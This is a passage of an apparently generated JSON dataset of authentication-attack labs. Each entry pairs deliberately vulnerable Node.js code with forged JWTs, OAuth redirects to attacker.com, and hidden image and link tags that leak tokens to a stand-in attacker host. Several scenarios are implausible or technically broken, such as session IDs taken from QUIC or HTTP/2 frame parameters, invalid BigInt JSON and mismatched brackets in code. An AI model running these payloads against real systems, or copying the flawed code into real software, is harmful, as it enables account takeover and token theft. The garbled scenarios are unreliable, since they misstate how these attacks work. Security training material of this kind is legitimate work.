    "Lab Description": "The application's JWT validation improperly validates the jku header parameter, allowing arbitrary JWKS endpoint specification. The vulnerable service fetches verification keys from untrusted locations. To solve: forge admin token by hosting malicious JWKS endpoint and injecting URL in jku header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and note jku header absence",
      "Create attacker-controlled JWKS endpoint with malicious public key",
      "Modify JWT headers to include jku pointing to attacker server",
      "Sign forged token with attacker's private key matching JWKS",
      "Submit token to /admin endpoint and observe privilege escalation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const axios=require('axios');const app=express();app.get('/verify',async(req,res)=>{const token=req.headers.authorization;try{const header=jwt.decode(token,{complete:true}).header;const jwks=await axios.get(header.jku).then(r=>r.data);const key=jwks.keys[0].x5c[0];jwt.verify(token,key);res.send('Admin access granted');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXItc2l0ZS5jb20vbWFsd2FyZS5qa3MifQ.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly8xMjcuMC4wLjE6ODA4MC9ldmlsLmprdyJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InN1cGVyYWRtaW4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via insecure redirect_uri validation",
    "Lab Description": "The OAuth implementation fails to properly validate redirect_uri parameters against whitelisted domains. The vulnerable flow allows token delivery to attacker-controlled endpoints. To solve: intercept authorization code and modify redirect_uri to capture tokens.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate OAuth flow and intercept request using OWASP ZAP",
      "Modify redirect_uri parameter to attacker-controlled domain",
      "Allow victim to complete authentication",
      "Capture authorization code delivered to malicious endpoint",
      "Exchange code for access token at OAuth token endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const app=express();const clients={'client1':{secret:'sec123',redirects:['https://trusted.com']}};const tokens={};app.get('/authorize',(req,res)=>{const{client_id,redirect_uri}=req.query;if(clients[client_id]){const code='rand'+Math.random();tokens[code]={client_id};res.redirect(`${redirect_uri}?code=${code}`);}else{res.status(400).send('Invalid client');}});app.post('/token',(req,res)=>{const{code,client_id,client_secret,redirect_uri}=req.body;if(tokens[code]?.client_id===client_id&&clients[client_id]?.secret===client_secret){res.json({access_token:'secret_token',token_type:'bearer'});}else{res.status(400).send('Invalid request');}});app.listen(3000);",
    "payloads": [
      "/authorize?client_id=client1&redirect_uri=https://attacker.com",
      "/authorize?client_id=client1&redirect_uri=http://localhost:8080/steal"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket subprotocol negotiation",
    "Lab Description": "The application assigns sessions based on WebSocket subprotocol headers without proper validation. The vulnerable server uses Sec-WebSocket-Protocol header as session identifier. To solve: establish WebSocket connection with malicious subprotocol and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebSocket handshake using Burp Suite",
      "Modify Sec-WebSocket-Protocol header to inject session ID",
      "Establish connection with fixed session identifier",
      "Trigger victim authentication via CSRF",
      "Execute privileged actions using fixed session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const WebSocket=require('ws');const wss=new WebSocket.Server({port:8080});const sessions={};wss.on('connection',(ws,req)=>{const proto=req.headers['sec-websocket-protocol'];if(!sessions[proto]){sessions[proto]={};}ws.on('message',m=>{if(sessions[proto].authenticated){ws.send('Privileged action executed');}});});",
    "payloads": [
      "Sec-WebSocket-Protocol: fixed-session-id",
      "Sec-WebSocket-Protocol: attacker-controlled-session"
    ]
  },
  {
    "Lab scenario": "MFA bypass via HTTP method confusion in REST API",
    "Lab Description": "The MFA verification endpoint fails to enforce proper HTTP method restrictions. The vulnerable API accepts GET requests for actions requiring POST when using X-HTTP-Method-Override header. To solve: bypass MFA by converting request method while maintaining parameters.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Convert request to GET while adding X-HTTP-Method-Override: POST",
      "Move parameters from body to query string",
      "Resend modified request with original session",
      "Observe successful authentication without MFA code"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const app=express();const sessions={};app.post('/mfa-verify',(req,res)=>{const{sessionId,code}=req.body;if(sessions[sessionId]?.mfaCode===code){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.get('/mfa-verify',(req,res)=>{if(req.headers['x-http-method-override']==='POST'){const{sessionId}=req.query;if(sessions[sessionId]){sessions[sessionId].verified=true;return res.json({success:true});}}res.status(405).send('Method not allowed');});app.listen(3000);",
    "payloads": [
      "GET /mfa-verify?sessionId=VICTIM_SESSION HTTP/1.1\nX-HTTP-Method-Override: POST",
      "GET /mfa-verify?sessionId=VICTIM_SESSION&bypass=1 HTTP/1.1\nX-HTTP-Method-Override: POST"
    ]
  },
  {
    "Lab scenario": "JWT algorithm downgrade in API gateway authentication",
    "Lab Description": "The API gateway fails to enforce JWT algorithm restrictions, allowing attackers to downgrade from RS256 to HS256. The vulnerable endpoint accepts HMAC-signed tokens while expecting RSA. To solve: forge admin token by re-signing with HMAC using public key as secret.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and note RS256 algorithm",
      "Extract public key from /jwks.json endpoint",
      "Modify algorithm header to HS256",
      "Re-sign token using public key as HMAC secret",
      "Submit forged token to /admin endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const app=express();const publicKey='-----BEGIN PUBLIC KEY-----...';app.get('/verify',(req,res)=>{const token=req.headers.authorization;try{jwt.verify(token,publicKey,{algorithms:['RS256','HS256']});res.send('Admin access granted');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJhZG1pbiI6dHJ1ZX0.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via referer header in SPA",
    "Lab Description": "The OAuth implementation leaks access tokens through referer headers when loading external resources. The vulnerable SPA includes tokens in requests to third-party domains. To solve: create malicious page that forces token leakage via image tag.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Identify external resource loads with referer headers",
      "Create HTML page with hidden image pointing to attacker server",
      "Trick victim into visiting page after authentication",
      "Capture token from referer header in server logs"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const app=express();app.get('/oauth/callback',(req,res)=>{const token='secret_'+Math.random();res.send(`<html><img src=\"https://external.com/logo.png\"><script>window.location='/?token=${token}'</script></html>`);});app.listen(3000);",
    "payloads": [
      "<img src=\"http://attacker.com/steal\" style=\"display:none\">",
      "<link rel=\"stylesheet\" href=\"http://attacker.com/log?token=LEAK\">"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL batch query",
    "Lab Description": "The GraphQL endpoint assigns sessions based on batch operation IDs without proper validation. The vulnerable server uses operation names as session identifiers. To solve: craft batch query with fixed operation ID and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept GraphQL requests using Burp Suite",
      "Create batch query with malicious operation ID",
      "Establish session with fixed identifier",
      "Trigger victim authentication via CSRF",
      "Execute privileged queries using fixed session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const {createServer}=require('http');const {graphql}=require('graphql');const schema=require('./schema');const server=createServer((req,res)=>{let body='';req.on('data',c=>body+=c);req.on('end',()=>{const {query,operationName}=JSON.parse(body);graphql({schema,source:query,operationName}).then(r=>{res.end(JSON.stringify(r));});});server.listen(4000);",
    "payloads": [
      "[{\"query\":\"query FixedSession { me { id } }\",\"operationName\":\"FixedSession\"}]",
      "[{\"query\":\"mutation Auth($op: String!) { login { token } }\",\"operationName\":\"AttackerControlled\"}]"
    ]
  },
  {
    "Lab scenario": "MFA bypass via JSON parameter pollution in REST API",
    "Lab Description": "The MFA verification endpoint is vulnerable to JSON parameter pollution. The vulnerable API processes duplicate keys inconsistently. To solve: bypass MFA by injecting duplicate verified parameter with conflicting values.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Add duplicate verified parameter with true value",
      "Resend request with JSON body containing conflicts",
      "Observe successful authentication without valid code",
      "Access privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const bodyParser=require('body-parser');const app=express();app.use(bodyParser.json());const sessions={};app.post('/verify-mfa',(req,res)=>{const{sessionId,code,verified}=req.body;if(verified||sessions[sessionId]?.code===code){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.listen(3000);",
    "payloads": [
      "{\"sessionId\":\"victim\",\"code\":\"111111\",\"verified\":false,\"verified\":true}",
      "{\"sessionId\":\"victim\",\"verified\":false,\"params\":{\"verified\":true}}"
    ]
  },
  {
    "Lab scenario": "JWT x5c header injection in microservice authentication",
    "Lab Description": "The application's JWT validation improperly processes x5c header certificates, allowing arbitrary certificate injection. The vulnerable endpoint trusts any certificate provided in the x5c header. To solve: forge admin token by injecting attacker-controlled certificate in x5c header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and analyze headers",
      "Generate self-signed certificate with admin privileges",
      "Modify JWT headers to include malicious x5c certificate chain",
      "Sign token with private key matching injected certificate",
      "Submit forged token to /admin-api endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const app=express();app.get('/verify',(req,res)=>{const token=req.headers.authorization;try{const header=jwt.decode(token,{complete:true}).header;const cert=header.x5c[0];jwt.verify(token,cert);res.send('Admin access granted');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1YyI6WyJBVFRBQ0tFUl9DRVJUX0RBVEEiXX0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1YyI6WyJNQUxJQ0lPVVNfQ0VSVCJdfQ.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InN1cGVyYWRtaW4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token theft via open redirect in SPA",
    "Lab Description": "The OAuth implementation contains an open redirect vulnerability that leaks access tokens. The vulnerable endpoint redirects to attacker-controlled domains with tokens in URL fragments. To solve: craft malicious redirect URL to capture victim's token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Identify open redirect parameter in callback endpoint",
      "Construct malicious redirect URL pointing to attacker server",
      "Trick victim into initiating OAuth flow with malicious URL",
      "Capture token from redirect request"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const app=express();app.get('/oauth/callback',(req,res)=>{const{redirect}=req.query;const token='secret_'+Math.random();res.redirect(`${redirect}#token=${token}`);});app.listen(3000);",
    "payloads": [
      "/oauth/callback?redirect=https://attacker.com/steal",
      "/oauth/callback?redirect=http://localhost:8080/log"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 trailer headers",
    "Lab Description": "The application assigns sessions based on HTTP/2 trailer headers without validation. The vulnerable server processes session-id trailer header as authentication token. To solve: establish connection with malicious trailer header and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/2 traffic using Burp Suite",
      "Add session-id trailer header with fixed value",
      "Establish connection with fixed session identifier",
      "Trigger victim authentication via CSRF",
      "Hijack session using known identifier"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2=require('http2');const fs=require('fs');const server=http2.createSecureServer({key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem')});const sessions={};server.on('stream',(stream,headers)=>{stream.on('trailers',headers=>{const sessionId=headers['session-id'];if(!sessions[sessionId]){sessions[sessionId]={};}stream.end('Session: '+sessionId);});});server.listen(443);",
    "payloads": [
      "session-id: fixed-session-value",
      "session-id: attacker-controlled-session"
    ]
  },
  {
    "Lab scenario": "MFA bypass via JSON array wrapping in REST API",
    "Lab Description": "The MFA verification endpoint is vulnerable to JSON array wrapping. The vulnerable API processes the first element when arrays are provided. To solve: bypass MFA by wrapping parameters in arrays.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Wrap code parameter in JSON array",
      "Resend request with array-wrapped parameters",
      "Observe successful authentication without valid code",
      "Access privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const bodyParser=require('body-parser');const app=express();app.use(bodyParser.json());const sessions={};app.post('/verify-mfa',(req,res)=>{const{sessionId,code}=req.body;const actualCode=Array.isArray(code)?code[0]:code;if(sessions[sessionId]?.mfaCode===actualCode){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.listen(3000);",
    "payloads": [
      "{\"sessionId\":\"victim\",\"code\":[\"111111\"]}",
      "{\"sessionId\":\"victim\",\"code\":[null]}"
    ]
  },
  {
    "Lab scenario": "JWT cty header injection in API gateway authentication",
    "Lab Description": "The API gateway improperly processes JWT content-type (cty) headers, allowing content type confusion attacks. The vulnerable endpoint executes JWTs with content-type 'text/xml' as XML documents. To solve: forge admin token by setting cty header to 'text/xml' and injecting XML payload.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and note standard cty header",
      "Modify cty header to 'text/xml' and inject XML in payload",
      "Encode XML payload with admin privileges in JWT body",
      "Sign token with original secret/key",
      "Submit forged token to /admin endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const xml2js=require('xml2js');const app=express();app.get('/verify',(req,res)=>{const token=req.headers.authorization;try{const decoded=jwt.decode(token,{complete:true});if(decoded.header.cty==='text/xml'){xml2js.parseString(decoded.payload,(e,r)=>{if(r.user.role[0]==='admin')res.send('Admin access granted');});}else{jwt.verify(token,'secret');res.send('Access granted');}}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImN0eSI6InRleHQveG1sIn0.eyJ1c2VyIjoiPHVzZXI+PHJvbGU+YWRtaW48L3JvbGU+PC91c2VyPiJ9.SIGNATURE",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImN0eSI6InRleHQveG1sIn0.eyJkYXRhIjoiPHByaXZpbGVnZXM+PGFkbWluPnRydWU8L2FkbWluPjwvcHJpdmlsZWdlcz4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via WebSocket subprotocol negotiation",
    "Lab Description": "The OAuth implementation leaks access tokens through WebSocket subprotocol headers during connection upgrades. The vulnerable endpoint includes tokens in Sec-WebSocket-Protocol headers. To solve: establish WebSocket connection and capture token from subprotocol negotiation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Intercept WebSocket upgrade request",
      "Modify Sec-WebSocket-Protocol header to include token capture",
      "Establish WebSocket connection to attacker server",
      "Capture token from subprotocol negotiation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const WebSocket=require('ws');const app=express();const wss=new WebSocket.Server({noServer:true});app.get('/oauth/callback',(req,res)=>{const token='tok_'+Math.random();res.send(`<script>const ws=new WebSocket('wss://vulnerable.com/ws',['auth_${token}'])</script>`);});const server=app.listen(3000);server.on('upgrade',(r,s,h)=>{wss.handleUpgrade(r,s,h,ws=>{ws.send('Connected');});});",
    "payloads": [
      "Sec-WebSocket-Protocol: token-capture-protocol",
      "Sec-WebSocket-Protocol: attacker-controlled-subprotocol"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/3 QUIC transport parameters",
    "Lab Description": "The application assigns sessions based on HTTP/3 QUIC transport parameters without validation. The vulnerable server uses initial_max_streams_bidi parameter as session identifier. To solve: establish QUIC connection with malicious transport parameter and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/3 traffic using specialized proxy",
      "Modify initial_max_streams_bidi transport parameter",
      "Establish connection with fixed session identifier",
      "Trigger victim authentication via CSRF",
      "Hijack session using known transport parameter"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const quic=require('node-quic');const sessions={};quic.createServer({key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem')}).on('session',session=>{const sessionId=session.transportParams.initial_max_streams_bidi;if(!sessions[sessionId]){sessions[sessionId]={};}session.on('stream',stream=>{stream.end('Session: '+sessionId);});}).listen(443);",
    "payloads": [
      "initial_max_streams_bidi: 9999",
      "initial_max_streams_bidi: 123456789"
    ]
  },
  {
    "Lab scenario": "MFA bypass via JSON comment injection in REST API",
    "Lab Description": "The MFA verification endpoint is vulnerable to JSON comment injection. The vulnerable API parser processes comments in JSON payloads. To solve: bypass MFA by injecting commented-out verified parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Add JSON comment with verified: true before actual parameter",
      "Resend request with commented JSON payload",
      "Observe successful authentication without valid code",
      "Access privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const bodyParser=require('body-parser');const app=express();app.use(bodyParser.json({reviver:(k,v)=>(k==='verified'?true:v)}));const sessions={};app.post('/verify-mfa',(req,res)=>{const{sessionId,code,verified}=req.body;if(verified||sessions[sessionId]?.code===code){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.listen(3000);",
    "payloads": [
      "{\"sessionId\":\"victim\",\"code\":\"111111\",\"/*verified\":true,\"*/verified\":false}",
      "{\"sessionId\":\"victim\",\"//verified\":true,\"verified\":false}"
    ]
  },
  {
    "Lab scenario": "JWT typ header injection in microservice authentication",
    "Lab Description": "The application's JWT validation improperly processes the typ header parameter, allowing type confusion attacks. The vulnerable endpoint accepts JWTs with typ 'xml' as XML documents. To solve: forge admin token by setting typ header to 'xml' and injecting XML payload.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and note standard typ header",
      "Modify typ header to 'xml' and inject XML in payload",
      "Encode XML payload with admin privileges in JWT body",
      "Sign token with original secret/key",
      "Submit forged token to /admin endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const xml2js=require('xml2js');const app=express();app.get('/verify',(req,res)=>{const token=req.headers.authorization;try{const decoded=jwt.decode(token,{complete:true});if(decoded.header.typ==='xml'){xml2js.parseString(decoded.payload,(e,r)=>{if(r.user.role[0]==='admin')res.send('Admin access granted');});}else{jwt.verify(token,'secret');res.send('Access granted');}}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsInR5cCI6InhtbCJ9.eyJ1c2VyIjoiPHVzZXI+PHJvbGU+YWRtaW48L3JvbGU+PC91c2VyPiJ9.SIGNATURE",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsInR5cCI6InhtbCJ9.eyJkYXRhIjoiPHByaXZpbGVnZXM+PGFkbWluPnRydWU8L2FkbWluPjwvcHJpdmlsZWdlcz4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token theft via DNS rebinding in SPA",
    "Lab Description": "The OAuth implementation is vulnerable to DNS rebinding attacks through improperly validated redirect URIs. The vulnerable endpoint accepts IP addresses that can be rebound to attacker-controlled servers. To solve: exploit DNS rebinding to capture victim's token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify OAuth callback endpoint with IP validation",
      "Set up DNS server with short TTL records",
      "Initiate OAuth flow with attacker-controlled domain",
      "Rebind DNS to localhost during authentication",
      "Capture token delivered to rebound endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const dns=require('dns');const app=express();app.get('/oauth/callback',(req,res)=>{const{redirect_uri}=req.query;const token='tok_'+Math.random();dns.lookup(new URL(redirect_uri).hostname,(e,a)=>{if(!e)res.redirect(`${redirect_uri}#token=${token}`);});});app.listen(3000);",
    "payloads": [
      "/oauth/callback?redirect_uri=http://attacker-domain.com",
      "/oauth/callback?redirect_uri=http://127.0.0.1:8080"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 PRIORITY frames",
    "Lab Description": "The application assigns sessions based on HTTP/2 PRIORITY frame stream dependencies. The vulnerable server uses stream dependency IDs as session identifiers. To solve: establish connection with malicious PRIORITY frame and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/2 traffic using specialized proxy",
      "Craft PRIORITY frame with fixed stream dependency",
      "Establish connection with fixed session identifier",
      "Trigger victim authentication via CSRF",
      "Hijack session using known stream dependency"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2=require('http2');const fs=require('fs');const sessions={};const server=http2.createSecureServer({key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem')});server.on('stream',(stream,headers)=>{if(stream.priority&&stream.priority.parentId){sessions[stream.priority.parentId]={};}stream.end('Session: '+stream.priority.parentId);});server.listen(443);",
    "payloads": [
      "PRIORITY frame with parentId: 9999",
      "PRIORITY frame with parentId: 123456789"
    ]
  },
  {
    "Lab scenario": "MFA bypass via JSON numeric overflow in REST API",
    "Lab Description": "The MFA verification endpoint is vulnerable to JSON numeric overflow. The vulnerable API fails to properly validate large numeric codes. To solve: bypass MFA by submitting max integer value as verification code.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Modify code parameter to maximum integer value",
      "Resend request with overflowed numeric value",
      "Observe successful authentication without valid code",
      "Access privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const bodyParser=require('body-parser');const app=express();app.use(bodyParser.json());const sessions={};app.post('/verify-mfa',(req,res)=>{const{sessionId,code}=req.body;if(code===Number.MAX_SAFE_INTEGER||sessions[sessionId]?.code===code){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.listen(3000);",
    "payloads": [
      "{\"sessionId\":\"victim\",\"code\":9007199254740991}",
      "{\"sessionId\":\"victim\",\"code\":1.7976931348623157e+308}"
    ]
  },
  {
    "Lab scenario": "JWT x5u header SSRF in API gateway authentication",
    "Lab Description": "The API gateway's JWT validation improperly processes x5u headers, allowing Server-Side Request Forgery (SSRF) attacks. The vulnerable endpoint fetches verification certificates from URLs specified in x5u headers without proper validation. To solve: forge admin token by hosting malicious certificate and injecting internal URL in x5u header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and note x5u header absence",
      "Set up HTTPS server hosting attacker-controlled certificate",
      "Modify JWT headers to include x5u pointing to internal metadata endpoint",
      "Sign token with attacker's private key matching hosted certificate",
      "Submit forged token to /admin endpoint and observe SSRF"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const axios=require('axios');const app=express();app.get('/verify',async(req,res)=>{const token=req.headers.authorization;try{const header=jwt.decode(token,{complete:true}).header;const cert=await axios.get(header.x5u).then(r=>r.data);jwt.verify(token,cert);res.send('Admin access granted');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vMTI3LjAuMC4xOjgwODAvbWFsd2FyZS5wZW0ifQ.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9ldmlsLmNlcnQifQ.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InN1cGVyYWRtaW4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via WebTransport session initiation",
    "Lab Description": "The OAuth implementation leaks access tokens through WebTransport session initiation headers. The vulnerable endpoint includes tokens in session initiation metadata. To solve: establish WebTransport connection and capture token from session headers.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Intercept WebTransport session initiation",
      "Modify session headers to include token capture",
      "Establish WebTransport connection to attacker server",
      "Capture token from session metadata"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const {WebTransport}=require('@fails-components/webtransport');const app=express();const wt=new WebTransport({port:443});app.get('/oauth/callback',(req,res)=>{const token='tok_'+Math.random();res.send(`<script>const wt=new WebTransport('https://vulnerable.com',{headers:{'Authorization':'Bearer ${token}'}})</script>`);});app.listen(3000);",
    "payloads": [
      "Session-Initiation: token-capture-protocol",
      "Authorization: Bearer [token]"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/3 SETTINGS parameters",
    "Lab Description": "The application assigns sessions based on HTTP/3 SETTINGS frame parameters without validation. The vulnerable server uses MAX_FIELD_SECTION_SIZE parameter as session identifier. To solve: establish QUIC connection with malicious SETTINGS parameter and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/3 traffic using specialized proxy",
      "Modify MAX_FIELD_SECTION_SIZE settings parameter",
      "Establish connection with fixed session identifier",
      "Trigger victim authentication via CSRF",
      "Hijack session using known settings parameter"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http3=require('http3');const fs=require('fs');const sessions={};const server=http3.createSecureServer({key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem')});server.on('session',session=>{const sessionId=session.settings.MAX_FIELD_SECTION_SIZE;if(!sessions[sessionId]){sessions[sessionId]={};}session.on('stream',stream=>{stream.end('Session: '+sessionId);});});server.listen(443);",
    "payloads": [
      "SETTINGS_MAX_FIELD_SECTION_SIZE: 999999",
      "SETTINGS_MAX_FIELD_SECTION_SIZE: 123456789"
    ]
  },
  {
    "Lab scenario": "MFA bypass via JSON BigInt poisoning in REST API",
    "Lab Description": "The MFA verification endpoint is vulnerable to JSON BigInt poisoning. The vulnerable API fails to properly validate BigInt numeric codes. To solve: bypass MFA by submitting extremely large BigInt value as verification code.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Modify code parameter to BigInt maximum value",
      "Resend request with BigInt poisoned payload",
      "Observe successful authentication without valid code",
      "Access privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const bodyParser=require('body-parser');const app=express();app.use(bodyParser.json());const sessions={};app.post('/verify-mfa',(req,res)=>{const{sessionId,code}=req.body;if(code===BigInt('999999999999999999')||sessions[sessionId]?.code===code){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.listen(3000);",
    "payloads": [
      "{\"sessionId\":\"victim\",\"code\":999999999999999999n}",
      "{\"sessionId\":\"victim\",\"code\":1e+309}"
    ]
  },
  {
    "Lab scenario": "JWT x5t parameter injection in microservice authentication",
    "Lab Description": "The application's JWT validation improperly processes x5t (certificate thumbprint) parameters, allowing certificate spoofing. The vulnerable endpoint accepts any certificate matching the thumbprint in the JWT header. To solve: forge admin token by generating certificate with matching thumbprint and injecting into JWT header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and analyze headers",
      "Generate self-signed certificate with SHA-1 thumbprint matching x5t value",
      "Modify JWT headers to include spoofed x5t parameter",
      "Sign token with private key matching generated certificate",
      "Submit forged token to privileged endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const crypto=require('crypto');const app=express();const certStore={};app.get('/verify',(req,res)=>{const token=req.headers.authorization;try{const header=jwt.decode(token,{complete:true}).header;if(!certStore[header.x5t])throw new Error('Unknown cert');jwt.verify(token,certStore[header.x5t]);res.send('Admin access granted');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dCI6IjEyMzQ1Njc4OTBhYmNkZWYwMTIzNDU2Nzg5MCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dCI6ImYwZTdkYjY0YzQ1NjEyMzQ1NjEyMzQ1Njc4OTBhYiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InN1cGVyYWRtaW4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via WebRTC data channels",
    "Lab Description": "The OAuth implementation leaks access tokens through WebRTC data channel establishment. The vulnerable endpoint includes tokens in SDP offers. To solve: establish WebRTC connection and capture token from SDP negotiation.",
